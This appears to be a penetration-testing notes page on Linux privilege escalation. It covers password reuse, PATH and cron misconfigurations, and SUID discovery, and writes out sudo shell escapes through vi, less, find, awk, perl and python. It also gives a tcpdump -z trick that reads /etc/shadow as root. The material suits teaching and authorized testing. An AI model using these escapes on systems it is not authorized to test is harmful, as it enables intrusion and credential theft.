# Privilege Escalation

So you have a limited shell on the machine. But it is limited. For example: 

You can't hide very effectivly. 
You can't bind ports below 1024.
Read and write any file
Persist easily between reboots.

These are all things we want to be able to do.
Watch this video!
http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams

http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections

http://netsec.ws/?p=309

https://www.rebootuser.com/?page_id=1721

**Don't use binary exploits if you can avoid it. If you use it it might crash the machine. So binary exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the sys.log**

## Linux

### Weak or reused passwords

If there is a web-server, check the connection to the database. Try that password. Also log into the database with the user you found. Is there a admin-account that might be reusing passwords?

Config-files
postfix
newsbeauter

### Configuration mistakes

#### Programs running as root
**Web-server**
Running as root

**Mysql**

#### Bad path configuration
Putting . in the path
If you put a dot in your path you won't have to write `./binary` to be able to execute it. You will be able to execute any script or binary that is in the current directory.

Why do people/sysadmins do this? Because they are lazy and won't want to write `./`.

This explains it
https://hackmag.com/security/reach-the-root/
And here
http://www.dankalia.com/tutor/01005/0100501004.htm

#### **Cronjob** 
With privileges running script that are editable for other users. 

#### World writable scripts invoked as root
World/user writable scripts that are invoked by root can me rewritten to escalate privileges.

Also check scripts that are called by these scripts.

```
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```


#### World/user writable binaries

#### Weak permissions on LD_preload

https://blog.maleadt.net/2015/02/25/sudo-escalation/

#### Homemade crappy suid programs
**SUID files**

SUID is a bit that you can set on a file. If you run a binary the binary is run as the user who is running it. But if the binary has the SUID-bit it will be run as the owner of that binary. This can be abused.

Here is how you find SUID files:
```
find / -perm -u=s -type f 2>/dev/null
```

Run ltrace on them to see what they do.

#### Setuid/setuig

SUID is a bit that you can set on a file. If you run a binary the binary is run as the user who is running it. But if the binary has the SUID-bit it will be run as the owner of that binary. This can be abused.
Any editor with a setudi/setuig can be abused.

**nmap**
SUID on nmap.

Find them

```
#Find SUID
find / -perm -u=s -type f 2>/dev/null

#Find GUID
find / -perm -g=s -type f 2>/dev/null
```

### Abusing sudo-rights

If you have a shell that has limited sudo programs you might still be able to use it. Any program that can write or overwrite can be used. If you have `cp` you can overwrite `/etc/shadow` or `/etc/sudoers`. 
**ht**
The text/binary-editor HT running as sudo

**nano**

**vi/vim**
With vi it is even easier. Just open vi
```
sudo vi
:shell

:set shell=/bin/bash:shell	
:!bash
```
And you have shell.

**less**
From less you can go into vi, and then into a shell
```
sudo less /etc/shadow
v
:shell
```

**more**
You need to run more on a file that is bigger than your screen.
```
sudo more /home/pelle/myfile
!/bin/bash
```

**cp**
Copy and overwrite /etc/shadow

**mv**
Overwrite /etc/shadow or /etc/sudoers

**find**

```
sudo find / -exec bash -i \;

find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; 
```

**python/perl/ruby/lua/etc**

```
sudo perl
exec "/bin/bash";
ctr-d
```

```
sudo python
import os
os.system("/bin/bash")
```

**nmap**

**awk**

```
awk 'BEGIN {system("/bin/bash")}'
```

**bash**

**sh**

**man**

**nc**

**netcat**

**ruby**

**lua**

**irb** 

**tcpdump**

https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/
```
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

**emacs**

### Software vulnerabilites

Software vulnerabilites can lead to priv-esc, like vulnerabiliteis in:
- Kernel
```
uname -a
/etc/issue*
/etc/release
```

**Tools**
```
# Programming tools
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc

#Upload tools
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```



#### Binary expoits against root owned binaries
- sudo
- Chrootkit


## Windows

## References
https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/